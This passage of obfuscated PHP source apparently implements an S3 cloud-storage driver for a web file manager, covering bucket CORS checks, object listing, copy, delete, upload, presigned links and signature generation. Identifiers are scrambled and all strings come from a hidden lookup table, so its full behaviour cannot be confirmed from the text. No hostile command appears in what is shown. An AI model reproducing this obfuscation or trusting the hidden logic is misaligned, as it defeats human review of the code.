intval($ΤΈφά[$²’― ‹[79]]); } if (isset($ΤΈφά[$²’― ‹[207]])) { $΅±φ²γΏ[$²’― ‹[88]] = intval($ΤΈφά[$²’― ‹[207]]); } } } $Ωπκ [] = $΅±φ²γΏ; } return $Ωπκ ; } public function slicePath($ήεΉ΅) { $Χ›Ζ‰µΘ =& $_SERVER[γγάψ½]; $ΓΚδ¬Δ = explode($Χ›Ζ‰µΘ[8], trim($ήεΉ΅, $Χ›Ζ‰µΘ[8])); $―–Π½ή­ = 0; do { ++$―–Π½ή­; $”³Υχΐ”[] = implode($Χ›Ζ‰µΘ[8], array_slice($ΓΚδ¬Δ, 0, $―–Π½ή­)) . $Χ›Ζ‰µΘ[8]; } while ($―–Π½ή­ < count($ΓΚδ¬Δ)); $”³Υχΐ”[count($ΓΚδ¬Δ) - 1] = $ήεΉ΅; return $”³Υχΐ”; } public function getHost() { $—Ύ“Ϋχ =& $_SERVER[γγάψ½]; $Ξ²›ίφ = parse_url(trim($this->domain, $—Ύ“Ϋχ[8])); $½·Σ = isset($Ξ²›ίφ[$—Ύ“Ϋχ[208]]) ? $Ξ²›ίφ[$—Ύ“Ϋχ[208]] : http_type(); $Ζ‘——†λ = isset($Ξ²›ίφ[$—Ύ“Ϋχ[209]]) ? $Ξ²›ίφ[$—Ύ“Ϋχ[209]] : $Ξ²›ίφ[$—Ύ“Ϋχ[87]]; if (isset($Ξ²›ίφ[$—Ύ“Ϋχ[210]])) { $Ζ‘——†λ .= $—Ύ“Ϋχ[4] . $Ξ²›ίφ[$—Ύ“Ϋχ[210]]; } return $½·Σ . $—Ύ“Ϋχ[211] . $Ζ‘——†λ; } public function pathEncode($ ΣπΟΡ) { $®±—ν½¦ =& $_SERVER[γγάψ½]; return str_replace($®±—ν½¦[212], $®±—ν½¦[8], rawurlencode($ ΣπΟΡ)); } public function writeLog($ΥΓ¤µ―β = '', $·ί½Σ’ = false) { $Δ“½¨³¦ =& $_SERVER[γγάψ½]; $«Φρδχ = in_array(ACTION, array($Δ“½¨³¦[213], $Δ“½¨³¦[214])); if (!$«Φρδχ && !GLOBAL_DEBUG) { return; } $ξέ„„± = $ΥΓ¤µ―β; static $£άέΰΌµ = null; if (!$£άέΰΌµ) { $£άέΰΌµ = strtoupper($this->getType()); } $ΥΓ¤µ―β = $£άέΰΌµ . $Δ“½¨³¦[215] . $ΥΓ¤µ―β; if ($·ί½Σ’) { $§ΨΪ–ρΖ = error_get_last(); if ($§ΨΪ–ρΖ) { $ΥΓ¤µ―β = array($ΥΓ¤µ―β, $§ΨΪ–ρΖ); } } write_log($ΥΓ¤µ―β, $Δ“½¨³¦[216]); if ($«Φρδχ) { throw new Exception($ξέ„„±); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Ν—λ»Εδ) { set_timeout(); require_once SDK_DIR . $_SERVER[γγάψ½][217]; parent::__construct(); $this->_init($Ν—λ»Εδ); } public function _init($…γΏ­) { $³ΆΛ­Ι„ =& $_SERVER[γγάψ½]; $this->config = $…γΏ­; foreach ($…γΏ­ as $ΞΝΘε»Ώ => $κΦδύλα) { if (isset($this->{$ΞΝΘε»Ώ})) { $this->{$ΞΝΘε»Ώ} = $κΦδύλα; } } $this->endpoint = $…γΏ­[$³ΆΛ­Ι„[218]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $Θ΅Κ–•ΐ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($Θ΅Κ–•ΐ, 0, 7) == $³ΆΛ­Ι„[219]) { $Θ΅Κ–•ΐ = $³ΆΛ­Ι„[220] . substr($Θ΅Κ–•ΐ, 7); } $this->client->setEndpoint($Θ΅Κ–•ΐ); if (in_array(ACTION, array($³ΆΛ­Ι„[213], $³ΆΛ­Ι„[214]))) { $this->client->setExceptions(); } } public function setSignVersion($ι―¦ΘΙή = "\x76\64") { $this->signVer = $ι―¦ΘΙή; $this->client->setSignVersion($ι―¦ΘΙή); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $„θ­ηάύ) { return null; } } public function isBucketCors() { $τ‹κδΡ =& $_SERVER[γγάψ½]; $€‘γ•Κ = $this->getBucketCors(); if (!$€‘γ•Κ || !is_array($€‘γ•Κ)) { return !1; } if (!is_array($€‘γ•Κ[$τ‹κδΡ[221]])) { $€‘γ•Κ[$τ‹κδΡ[221]] = explode($τ‹κδΡ[50], $€‘γ•Κ[$τ‹κδΡ[221]]); } if ($€‘γ•Κ[$τ‹κδΡ[222]] != $τ‹κδΡ[223] || !in_array($τ‹κδΡ[223], $€‘γ•Κ[$τ‹κδΡ[221]])) { return !1; } $”€³•κ = array_map($τ‹κδΡ[224], $€‘γ•Κ[$τ‹κδΡ[225]]); if (!is_array($”€³•κ)) { $”€³•κ = array(); } $άΤφΖγΜ = array($τ‹κδΡ[226], $τ‹κδΡ[227], $τ‹κδΡ[228], $τ‹κδΡ[229], $τ‹κδΡ[230]); $ή›–μ„ = array_diff($άΤφΖγΜ, $”€³•κ); return empty($ή›–μ„); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($ΙτΛ―ήΞ, $μΪώΩ = '', $Χ«£°‘ν = REPEAT_RENAME) { $³¶²ρ•¥ = $this->setContent($ΙτΛ―ήΞ, $μΪώΩ); if ($³¶²ρ•¥ !== !1) { return $this->getPathOuter($ΙτΛ―ήΞ); } return !1; } public function mkdir($°μΞΊ‰Θ, $ϊπς³‰Ί = REPEAT_SKIP) { $‹µξ„… =& $_SERVER[γγάψ½]; if (empty($°μΞΊ‰Θ) && $°μΞΊ‰Θ !== $‹µξ„…[231]) { return !1; } if ($ϊπς³‰Ί && $this->_isFolder($°μΞΊ‰Θ)) { return $this->getPathOuter($°μΞΊ‰Θ); } $„µεψό = $this->setContent($°μΞΊ‰Θ, $‹µξ„…[12], !0); if ($„µεψό !== !1) { return $this->getPathOuter($°μΞΊ‰Θ); } return !1; } public function copyFile($σεσΏδΫ, $ϊ µΉ, $ΐ»›χ  = array()) { $γ† =& $_SERVER[γγάψ½]; $’³ΟΨ―ϊ = $this->objectMeta($σεσΏδΫ); if (!$’³ΟΨ―ϊ) { return !1; } if ($’³ΟΨ―ϊ[$γ†[79]] <= 1024 * 1024 * 200) { $ƒΘυΉΤ« = $this->client->copyObject($this->bucket, $σεσΏδΫ, $this->bucket, $ϊ µΉ, $γ†[232], $ΐ»›χ ); } else { $ƒΘυΉΤ« = $this->client->multiCopyObject($this->bucket, $σεσΏδΫ, $this->bucket, $ϊ µΉ, $ΐ»›χ ); } $ƒΘυΉΤ« = $ƒΘυΉΤ« ? $this->getPathOuter($ϊ µΉ) : !1; return $ƒΘυΉΤ«; } public function moveFile($Ϊέ¶Ψµ, $κηώψ) { if ($this->copyFile($Ϊέ¶Ψµ, $κηώψ)) { $this->delFile($Ϊέ¶Ψµ); return $this->getPathOuter($κηώψ); } return !1; } public function delFile($Σ¬ώ•) { return $this->client->deleteObject($this->bucket, $Σ¬ώ•); } public function delFolder($΅­¨£) { $€“Ά®π =& $_SERVER[γγάψ½]; if (!$this->exist($΅­¨£)) { return !0; } $this->listItemCache = !1; $‘’φςΖϊ = $this->fileList($΅­¨£); $this->listItemCache = !0; $π“Ή«Ά¨ = trim($΅­¨£, $€“Ά®π[8]) . $€“Ά®π[8]; if (!empty($΅­¨£) && $΅­¨£ !== $€“Ά®π[231] && !in_array($π“Ή«Ά¨, $‘’φςΖϊ[$€“Ά®π[85]])) { $‘’φςΖϊ[$€“Ά®π[85]][] = $π“Ή«Ά¨; } $ΧαζΚ = $this->delByBatch($‘’φςΖϊ[$€“Ά®π[86]]); if (!$ΧαζΚ) { return !1; } $ΧαζΚ = $this->delByBatch($‘’φςΖϊ[$€“Ά®π[85]]); if (!$ΧαζΚ) { return !1; } return $this->delFile($π“Ή«Ά¨); } private function delByBatch($®ώΈ…Μ) { foreach (array_chunk($®ώΈ…Μ, 1000) as $ΊΰΟΌΙι) { $ΣυΖγΊΔ = $this->client->deleteObjects($this->bucket, $ΊΰΟΌΙι); if (!$ΣυΖγΊΔ) { return !1; } } return !0; } public function rename($Κϋσƒ®Α, $σ‹ϊ¥±¨) { return $this->renameObject($Κϋσƒ®Α, $σ‹ϊ¥±¨); } public function listPath($οϋζσ‡, $κΩΐΛϋ¦ = false) { $ψργ =& $_SERVER[γγάψ½]; $εγΏρ¥π = $this->fileList($οϋζσ‡, $ψργ[8], !0); foreach ($εγΏρ¥π[$ψργ[85]] as $άΠ => $¨νή¶¨) { $εγΏρ¥π[$ψργ[85]][$άΠ] = $this->folderInfo($¨νή¶¨, $κΩΐΛϋ¦, $¨νή¶¨); } foreach ($εγΏρ¥π[$ψργ[86]] as $άΠ => $¨νή¶¨) { $εγΏρ¥π[$ψργ[86]][$άΠ] = $this->fileInfo($¨νή¶¨[$ψργ[32]], $κΩΐΛϋ¦, $¨νή¶¨); } return $εγΏρ¥π; } protected function infoChildren($Φ±¬οΆ½, &$Ο†Ύ’) { $‰ιε‚¶ύ =& $_SERVER[γγάψ½]; $λόΪ±® = $this->fileList($Φ±¬οΆ½, $‰ιε‚¶ύ[12], !0); $Ο†Ύ’[$‰ιε‚¶ύ[81]] += count($λόΪ±®[$‰ιε‚¶ύ[85]]); $Ο†Ύ’[$‰ιε‚¶ύ[80]] += count($λόΪ±®[$‰ιε‚¶ύ[86]]); foreach ($λόΪ±®[$‰ιε‚¶ύ[86]] as $δ€νΖ€) { if (!$δ€νΖ€ || !$δ€νΖ€[$‰ιε‚¶ύ[79]]) { continue; } $Ο†Ύ’[$‰ιε‚¶ύ[79]] += $δ€νΖ€[$‰ιε‚¶ύ[79]]; } } private function fileInfo($υνήΪλ, $‰Χνι = false, $ΑΟ®½Γ = array()) { $®έ·΄ιΈ =& $_SERVER[γγάψ½]; $κω¤ς = array($®έ·΄ιΈ[32] => $this->pathThis($υνήΪλ), $®έ·΄ιΈ[87] => $this->getPathOuter($υνήΪλ), $®έ·΄ιΈ[33] => $®έ·΄ιΈ[233], $®έ·΄ιΈ[169] => $this->ext($υνήΪλ), $®έ·΄ιΈ[79] => isset($ΑΟ®½Γ[$®έ·΄ιΈ[79]]) ? $ΑΟ®½Γ[$®έ·΄ιΈ[79]] : 0); if ($‰Χνι) { return $κω¤ς; } $κω¤ς[$®έ·΄ιΈ[234]] = $κω¤ς[$®έ·΄ιΈ[88]] = 0; $κω¤ς[$®έ·΄ιΈ[235]] = $κω¤ς[$®έ·΄ιΈ[236]] = !0; if (empty($ΑΟ®½Γ)) { $ΑΟ®½Γ = $this->objectMeta($υνήΪλ); if (!$ΑΟ®½Γ) { return $κω¤ς; } } if (isset($ΑΟ®½Γ[$®έ·΄ιΈ[237]]) && $ΑΟ®½Γ[$®έ·΄ιΈ[237]]) { $κω¤ς[$®έ·΄ιΈ[238]] = $ΑΟ®½Γ[$®έ·΄ιΈ[237]]; } if (isset($ΑΟ®½Γ[$®έ·΄ιΈ[207]])) { $κω¤ς[$®έ·΄ιΈ[88]] = $ΑΟ®½Γ[$®έ·΄ιΈ[207]]; } if (isset($ΑΟ®½Γ[$®έ·΄ιΈ[79]])) { $κω¤ς[$®έ·΄ιΈ[79]] = $ΑΟ®½Γ[$®έ·΄ιΈ[79]]; } return $κω¤ς; } private function folderInfo($Αυ¬‹Γ, $Α®ςό‹Ό = false, $Θ¨Ζ‰βΩ = array()) { $Τ¨μ²ή =& $_SERVER[γγάψ½]; $’ΑΛ™΅µ = array($Τ¨μ²ή[32] => $this->pathThis($Αυ¬‹Γ), $Τ¨μ²ή[87] => $this->getPathOuter($Τ¨μ²ή[8] . $Αυ¬‹Γ), $Τ¨μ²ή[33] => $Τ¨μ²ή[78]); if ($Α®ςό‹Ό) { return $’ΑΛ™΅µ; } $’ΑΛ™΅µ[$Τ¨μ²ή[234]] = $’ΑΛ™΅µ[$Τ¨μ²ή[88]] = 0; $’ΑΛ™΅µ[$Τ¨μ²ή[235]] = $’ΑΛ™΅µ[$Τ¨μ²ή[236]] = !0; if ($Αυ¬‹Γ == $Τ¨μ²ή[12]) { return $’ΑΛ™΅µ; } if (empty($Θ¨Ζ‰βΩ)) { $Θ¨Ζ‰βΩ = $this->objectMeta(trim($Αυ¬‹Γ, $Τ¨μ²ή[8]) . $Τ¨μ²ή[8]); } if (isset($Θ¨Ζ‰βΩ[$Τ¨μ²ή[207]])) { $’ΑΛ™΅µ[$Τ¨μ²ή[234]] = $Θ¨Ζ‰βΩ[$Τ¨μ²ή[207]]; } return $’ΑΛ™΅µ; } private function fileList($²ΨΣ, $½ΘΡΤ΄ = '', $δµ¶ΎΉθ = 0) { $τΏϊάΪ =& $_SERVER[γγάψ½]; $Βρ¦ΉΚζ = rtrim($²ΨΣ, $τΏϊάΪ[8]) . $τΏϊάΪ[8]; $ξύΟ² = $this->listObjs($Βρ¦ΉΚζ, null, null, $½ΘΡΤ΄); if (!$ξύΟ²) { return array($τΏϊάΪ[85] => array(), $τΏϊάΪ[86] => array()); } $²½θΛΪ = $Ύρ‘Ι‘ = array(); foreach ($ξύΟ²[$τΏϊάΪ[239]] as $°δΨδ) { $σ“σ›Π = $°δΨδ[$τΏϊάΪ[32]]; if ($σ“σ›Π == $Βρ¦ΉΚζ) { continue; } $ν™χ‚ = isset($°δΨδ[$τΏϊάΪ[79]]) ? $°δΨδ[$τΏϊάΪ[79]] : 0; $Ϊ—α§¬ = $ν™χ‚ == 0 && substr($σ“σ›Π, strlen($σ“σ›Π) - 1, 1) == $τΏϊάΪ[8] ? !0 : !1; $this->cacheMethodInfoSet($σ“σ›Π, $Ϊ—α§¬, $°δΨδ); if ($Ϊ—α§¬) { $²½θΛΪ[] = $σ“σ›Π; continue; } $Ύρ‘Ι‘[] = $δµ¶ΎΉθ ? $°δΨδ : $σ“σ›Π; } foreach ($ξύΟ²[$τΏϊάΪ[240]] as $°δΨδ) { $²½θΛΪ[] = $°δΨδ[$τΏϊάΪ[32]]; $this->cacheMethodInfoSet($°δΨδ[$τΏϊάΪ[32]], !0); } $this->cacheMethodInfoSet($²ΨΣ, !0); return array($τΏϊάΪ[85] => $²½θΛΪ, $τΏϊάΪ[86] => $Ύρ‘Ι‘); } private function listObjs($¨κ—Ί, $δƒ•Σ§χ = null, $§¶Νΐΰ = null, $έΫ—®Λ = null) { $ιΝ¶„Ό  =& $_SERVER[γγάψ½]; $¨κ—Ί = trim($¨κ—Ί, $ιΝ¶„Ό [8]); $”Γΰε»“ = empty($¨κ—Ί) && $¨κ—Ί !== $ιΝ¶„Ό [231] ? $ιΝ¶„Ό [12] : $¨κ—Ί . $ιΝ¶„Ό [8]; return $this->client->getBucket($this->bucket, $”Γΰε»“, $δƒ•Σ§χ, $§¶Νΐΰ, $έΫ—®Λ, !0); } public function has($ν ’τ‹•, $“άΙƒ‚Τ = false, $ΰ ¥¦ = true) { $ΟΦάα΅ =& $_SERVER[γγάψ½]; $ν ’τ‹• = trim($ν ’τ‹•, $ΟΦάα΅[8]); $Ωα€Ψ¦φ = empty($ν ’τ‹•) && $ν ’τ‹• !== $ΟΦάα΅[231] ? $ΟΦάα΅[12] : $ν ’τ‹• . $ΟΦάα΅[8]; $Εέ―Ν = null; $¦μ‰­± = 500; $ρƒ²™² = $ΟΦάα΅[8]; $ψζΨη† = $ΟΏΒ½΄† = array(); while (!0) { $΅τ‡όΏ = $this->listObjs($ν ’τ‹•, $Εέ―Ν, $¦μ‰­±, $ρƒ²™²); if (!$΅τ‡όΏ) { break; } $Εέ―Ν = $΅τ‡όΏ[$ΟΦάα΅[241]]; $ΣΨωΔΠ = $΅τ‡όΏ[$ΟΦάα΅[239]]; $¨…Γ†ιΊ = $΅τ‡όΏ[$ΟΦάα΅[240]]; if (empty($ΣΨωΔΠ) && empty($¨…Γ†ιΊ)) { break; } if (count($ΣΨωΔΠ) == 1 && $ΣΨωΔΠ[0][$ΟΦάα΅[32]] == $Ωα€Ψ¦φ) { break; } if ($“άΙƒ‚Τ) { if (count($ΣΨωΔΠ)) { $ΣΨωΔΠ = array_column($ΣΨωΔΠ, $ΟΦάα΅[32]); $ψζΨη† = array_merge($ψζΨη†, $ΣΨωΔΠ); } if (count($¨…Γ†ιΊ)) { $¨…Γ†ιΊ = array_column($¨…Γ†ιΊ, $ΟΦάα΅[32]); $ΟΏΒ½΄† = array_merge($ΟΏΒ½΄†, $¨…Γ†ιΊ); } if ($Εέ―Ν === null) { break; } continue; } if ($ΰ ¥¦) { if (!empty($ΣΨωΔΠ)) { if (count($ΣΨωΔΠ) > 1 || isset($ΣΨωΔΠ[0][$ΟΦάα΅[32]]) && $ΣΨωΔΠ[0][$ΟΦάα΅[32]] != $Ωα€Ψ¦φ) { return !0; } } } else { if (!empty($¨…Γ†ιΊ)) { return !0; } } if ($Εέ―Ν === null) { break; } } if ($“άΙƒ‚Τ) { $ψζΨη† = array_diff($ψζΨη†, array($Ωα€Ψ¦φ)); $ψζΨη† = count(array_unique($ψζΨη†)); $ΟΏΒ½΄† = count(array_unique($ΟΏΒ½΄†)); return array($ΟΦάα΅[242] => $ψζΨη†, $ΟΦάα΅[243] => $ΟΏΒ½΄†); } return !1; } public function listAll($ζή‡ησΕ) { $¶οΌΦδΗ =& $_SERVER[γγάψ½]; $ψ§Ήγ“ = $this->fileList($ζή‡ησΕ, $¶οΌΦδΗ[12], !0); $ν―³υσ = array_to_keyvalue($ψ§Ήγ“[$¶οΌΦδΗ[86]], $¶οΌΦδΗ[32]); foreach ($ψ§Ήγ“[$¶οΌΦδΗ[85]] as $φΓΙ¨·) { if (is_string($φΓΙ¨·)) { $ν―³υσ[$φΓΙ¨·] = array($¶οΌΦδΗ[79] => 0); } } return $this->listAllFiles($ζή‡ησΕ, $ν―³υσ); } public function canRead($ΊΠΔ―Θ) { $•ωΎψΖφ =& $_SERVER[γγάψ½]; $”΅±ζζ½ = $this->client->getAccessControlPolicy($this->bucket, $ΊΠΔ―Θ); if (!$”΅±ζζ½) { return !1; } return in_array($”΅±ζζ½, array($•ωΎψΖφ[244], $•ωΎψΖφ[245], $•ωΎψΖφ[246])) ? !0 : !1; } public function canWrite($»ά«ϋ) { $τ“Εκ =& $_SERVER[γγάψ½]; $²›Ύξ™¶ = $this->client->getAccessControlPolicy($this->bucket, $»ά«ϋ); if (!$²›Ύξ™¶) { return !1; } return in_array($²›Ύξ™¶, array($τ“Εκ[244], $τ“Εκ[245])) ? !0 : !1; } public function getContent($ύά™‘Ω) { return $this->client->getObject($this->bucket, $ύά™‘Ω); } public function setContent($‡ρζήι, $ήςƒΊκγ = '', $έ™Επ = false) { $’Μ©‹² =& $_SERVER[γγάψ½]; $‡ρζήι = $έ™Επ ? trim($‡ρζήι, $’Μ©‹²[8]) . $’Μ©‹²[8] : $‡ρζήι; $ΊΜςΆΓΠ = get_file_mime(get_path_ext($‡ρζήι)); $•’―ι = $this->client->putObject($ήςƒΊκγ, $this->bucket, $‡ρζήι, $’Μ©‹²[232], array(), $ΊΜςΆΓΠ); if (!$•’―ι) { return !1; } if ($έ™Επ) { return !0; } return $•’―ι ? !0 : !1; } public function fileSubstr($λΫΖν‘, $—Ο°δΌ, $µ¥ΠζΣ) { $Νζπ³± = $—Ο°δΌ + $µ¥ΠζΣ - 1; return $this->client->getObject($this->bucket, $λΫΖν‘, array($_SERVER[γγάψ½][247] => "\x62\x79\164\145\163\x3d{$—Ο°δΌ}\x2d{$Νζπ³±}")); } public function upload($£ΞςΛ§Θ, $ω¦υΤ², $ƒΕΣ†‡‰ = false, $ΥΤ» Άι = REPEAT_REPLACE) { $ς» φ― =& $_SERVER[γγάψ½]; $Ώ“ΌΘ¬– = array($ς» φ―[248] => @md5_file($ω¦υΤ²)); $ξµΉ€½γ = array($ς» φ―[249] => get_file_mime(get_path_ext($£ΞςΛ§Θ))); if (IO::size($ω¦υΤ²) <= 1024 * 1024 * 200) { $Υο©›Ηζ = $this->client->putObjectFile($ω¦υΤ², $this->bucket, $£ΞςΛ§Θ, $ς» φ―[232], $Ώ“ΌΘ¬–, $ξµΉ€½γ); return !empty($Υο©›Ηζ) ? $this->getPathOuter($£ΞςΛ§Θ) : !1; } $ΈφπΏ» = $this->client->multiUploadObject($ω¦υΤ², $this->bucket, trim($£ΞςΛ§Θ, $ς» φ―[8]), $Ώ“ΌΘ¬–, $ξµΉ€½γ); return $ΈφπΏ» ? $this->getPathOuter($£ΞςΛ§Θ) : !1; } public function download($––©δλ, $ϋΣλΠΦ) { if (!@is_dir($this->pathFather($ϋΣλΠΦ)) && !IO::mkdir($this->pathFather($ϋΣλΠΦ))) { return !1; } $—υ¥π± = $this->client->getObject($this->bucket, $––©δλ, array(), $ϋΣλΠΦ); return $—υ¥π± !== !1 ? $ϋΣλΠΦ : !1; } public function link($ό γΥϊ›, $ ψσε = array()) { return $this->getPreSignedURL($ό γΥϊ›, 3600 * 12, $ ψσε); } private function getPreSignedURL($› †©ε, $¥£·νΫ, $–”ΊΛ™ = array(), $¨²ρΫΒΈ = "\107\105\124") { $¦…§ΡΏ =& $_SERVER[γγάψ½]; $› †©ε = trim($› †©ε, $¦…§ΡΏ[8]); if ($this->signVer == $¦…§ΡΏ[250]) { return $this->client->getPreSignedV2URL($this->bucket, $› †©ε, $¥£·νΫ, $¨²ρΫΒΈ, $–”ΊΛ™); } return $this->client->getPreSignedV4URL($this->bucket, $› †©ε, $¥£·νΫ, array(), $¨²ρΫΒΈ, $–”ΊΛ™); } public function fileOut($ώ·σ¬―α, $²ρρΪ΅ = false, $ΏάΡι = false, $ΥΤ—Όο = '') { $Κ¬ηϋηώ =& $_SERVER[γγάψ½]; if ($this->isFileOutServer()) { return $this->fileOutServer($ώ·σ¬―α, $²ρρΪ΅, $ΏάΡι, $ΥΤ—Όο); } if (!$ΏάΡι) { $ΏάΡι = $this->pathThis($ώ·σ¬―α); } $Ίν£Χτ— = get_file_mime(get_path_ext($ΏάΡι)); if ($Ίν£Χτ— == $Κ¬ηϋηώ[251]) { return parent::fileOut($ώ·σ¬―α, $²ρρΪ΅, $ΏάΡι, $ΥΤ—Όο); } $Ό‹™ΐά = array($Κ¬ηϋηώ[252] => $Ίν£Χτ—); if ($²ρρΪ΅) { $Ό‹™ΐά[$Κ¬ηϋηώ[253]] = $Κ¬ηϋηώ[254] . rawurlencode($ΏάΡι); } else { } $Η ¬ϊΥ = $this->link($ώ·σ¬―α, $Ό‹™ΐά); $this->fileOutLink($Η ¬ϊΥ); } public function fileOutServer($σ¨Θ¦ΈΒ, $πΓΕ΅ύ = false, $ϊϊ‹ςΌ£ = false, $φΙϋω = '') { parent::fileOut($σ¨Θ¦ΈΒ, $πΓΕ΅ύ, $ϊϊ‹ςΌ£, $φΙϋω); } public function fileOutImageServer($—®ςΧΨΦ, $Χβ·‰ƒ = 250) { parent::fileOutImage($—®ςΧΨΦ, $Χβ·‰ƒ); } public function fileOutLink($ζεδΉΉ½) { $¦κΤπ°ι =& $_SERVER[γγάψ½]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($¦κΤπ°ι[67], $¦κΤπ°ι[66], $¦κΤπ°ι[68])) && !get_url_scheme($this->endpoint) && substr($ζεδΉΉ½, 0, 7) == $¦κΤπ°ι[219]) { $ζεδΉΉ½ = $¦κΤπ°ι[220] . substr($ζεδΉΉ½, 7); } header($¦κΤπ°ι[175] . $ζεδΉΉ½); die; } public function hashMd5($‹Θ®“Φ, $ΏΞ™χΉ = '') { $Ψ–©εΫξ = $this->objectMeta($‹Θ®“Φ); if (!$Ψ–©εΫξ) { return !1; } $ΏΞ™χΉ = $ΏΞ™χΉ ? $ΏΞ™χΉ : _get($Ψ–©εΫξ, $_SERVER[γγάψ½][255]); return $ΏΞ™χΉ; } public function uploadFormData($γ‡»φ, $φΕσύ·Ρ = 3600) { $–ΰΥΨ¦‹ =& $_SERVER[γγάψ½]; if (!$this->_isClientAsync()) { $–·¨ηΰ = $this->getPreSignedURL($γ‡»φ, $φΕσύ·Ρ, array(), $–ΰΥΨ¦‹[256]); return array($–ΰΥΨ¦‹[209] => str_replace($–ΰΥΨ¦‹[219], $–ΰΥΨ¦‹[257], $–·¨ηΰ)); } if (isset($GLOBALS[$–ΰΥΨ¦‹[6]][$–ΰΥΨ¦‹[92]][$–ΰΥΨ¦‹[258]]) && $GLOBALS[$–ΰΥΨ¦‹[6]][$–ΰΥΨ¦‹[92]][$–ΰΥΨ¦‹[258]] == $–ΰΥΨ¦‹[231]) { return $this->uploadMultiData($γ‡»φ, $φΕσύ·Ρ); } if ($this->signVer == $–ΰΥΨ¦‹[250]) { return $this->uploadFormDataV2($γ‡»φ, $φΕσύ·Ρ); } return $this->uploadFormDataV4($γ‡»φ, $φΕσύ·Ρ); } public function uploadFormDataV2($Ϊ«­‚Ν, $ΐίάίƒΙ = 3600) { $Κψ‹ƒ»† =& $_SERVER[γγάψ½]; $…Ψ§Τ = $this->pathFather($Ϊ«­‚Ν); $ΧΤΟιΗΆ = $this->client->getHttpUploadPostParams($this->bucket, $…Ψ§Τ, $Κψ‹ƒ»†[232], $ΐίάίƒΙ); $ΜΌΛ›¶ = array_merge((array) $ΧΤΟιΗΆ, array($Κψ‹ƒ»†[259] => $Κψ‹ƒ»†[250], $Κψ‹ƒ»†[209] => $this->getHost())); if ($this->_isClientAsync()) { unset($ΜΌΛ›¶[$Κψ‹ƒ»†[259]]); } return $ΜΌΛ›¶; } public function uploadFormDataV4($‘ΘϊΠβΧ, $τκ³βέ΅ = 3600) { $Κ»ΛΑƒ¶ =& $_SERVER[γγάψ½]; $ίΔΚ“Ν = $Κ»ΛΑƒ¶[232]; $Ξ­ψΈ¥Ζ = $Κ»ΛΑƒ¶[260]; $θ®―‘Β£ = $Κ»ΛΑƒ¶[62]; $―ΗΔ’· = gmdate($Κ»ΛΑƒ¶[261]); $–™›Μ΅ = gmdate($Κ»ΛΑƒ¶[262]); $¤…ΡΰΦώ = $Κ»ΛΑƒ¶[263]; $ΗΣό‡»“ = $τκ³βέ΅ . $Κ»ΛΑƒ¶[12]; $ΖΰψίΠ’ = $Κ»ΛΑƒ¶[264]; $ς†ο¨ = array($this->accessKey, $–™›Μ΅, $this->region, $θ®―‘Β£, $¤…ΡΰΦώ); $ΝκήΈδ¶ = implode($Κ»ΛΑƒ¶[8], $ς†ο¨); $τΣό€Ι› = array($Κ»ΛΑƒ¶[265] => gmdate($Κ»ΛΑƒ¶[266], strtotime($Κ»ΛΑƒ¶[267])), $Κ»ΛΑƒ¶[268] => array(array($Κ»ΛΑƒ¶[269] => $this->bucket), array($Κ»ΛΑƒ¶[270], $Κ»ΛΑƒ¶[271], $Κ»ΛΑƒ¶[12]), array($Κ»ΛΑƒ¶[270], $Κ»ΛΑƒ¶[272], $Κ»ΛΑƒ¶[12]), array($Κ»ΛΑƒ¶[273] => $ΖΰψίΠ’), array($Κ»ΛΑƒ¶[274] => $ΝκήΈδ¶), array($Κ»ΛΑƒ¶[275] => $Ξ­ψΈ¥Ζ), array($Κ»ΛΑƒ¶[276] => $―ΗΔ’·), array($Κ»ΛΑƒ¶[277] => $ΗΣό‡»“))); $πΫΪυ– = base64_encode(json_encode($τΣό€Ι›)); $χΕω = hash_hmac($Κ»ΛΑƒ¶[278], $–™›Μ΅, $Κ»ΛΑƒ¶[279] . $this->secret, !0); $§™Θ«Ξ΄ = hash_hmac($Κ»ΛΑƒ¶[278], $this->region, $χΕω, !0); $ΦβΉυµρ = hash_hmac($Κ»ΛΑƒ¶[278], $θ®―‘Β£, $§™Θ«Ξ΄, !0); $μΝ¬ώ‰ό = hash_hmac($Κ»ΛΑƒ¶[278], $¤…ΡΰΦώ, $ΦβΉυµρ, !0); $Ω¶ψΘΝΈ = hash_hmac($Κ»ΛΑƒ¶[278], $πΫΪυ–, $μΝ¬ώ‰ό); $±·°Π« = array($Κ»ΛΑƒ¶[249] => $Κ»ΛΑƒ¶[12], $Κ»ΛΑƒ¶[273] => $ΖΰψίΠ’, $Κ»ΛΑƒ¶[280] => $πΫΪυ–, $Κ»ΛΑƒ¶[274] => $ΝκήΈδ¶, $Κ»ΛΑƒ¶[275] => $Ξ­ψΈ¥Ζ, $Κ»ΛΑƒ¶[276] => $―ΗΔ’·, $Κ»ΛΑƒ¶[277] => $ΗΣό‡»“, $Κ»ΛΑƒ¶[281] => $Ω¶ψΘΝΈ, $Κ»ΛΑƒ¶[259] => $Κ»ΛΑƒ¶[250], $Κ»ΛΑƒ¶[209] => $this->getHost()); if ($this->_isClientAsync()) { unset($±·°Π«[$Κ»ΛΑƒ¶[259]]); } return $±·°Π«; } public function uploadMultiData($‹©θ£Ά, $πιωδΧ = 3600) { $ή—Ήτ =& $_SERVER[γγάψ½]; $ΤήόΘ³ = $this->signVer == $ή—Ήτ[250] ? gmdate($ή—Ήτ[282]) : gmdate($ή—Ήτ[283]); $«¶§™³ = array(); $Ϋα†ψ« = $this->client->getUploadId($this->bucket, $‹©θ£Ά, $«¶§™³); if (!$Ϋα†ψ«) { return !1; } $ϋώ΄χΥ¥ = array($ή—Ήτ[284] => $Ϋα†ψ«, $ή—Ήτ[209] => $this->getHost() . $ή—Ήτ[8] . $this->pathEncode($‹©θ£Ά), $ή—Ήτ[285] => $ΤήόΘ³, $ή—Ήτ[97] => $‹©θ£Ά, $ή—Ήτ[259] => $this->signVer); if ($this->_isClientAsync()) { unset($ϋώ΄χΥ¥[$ή—Ήτ[259]]); } return 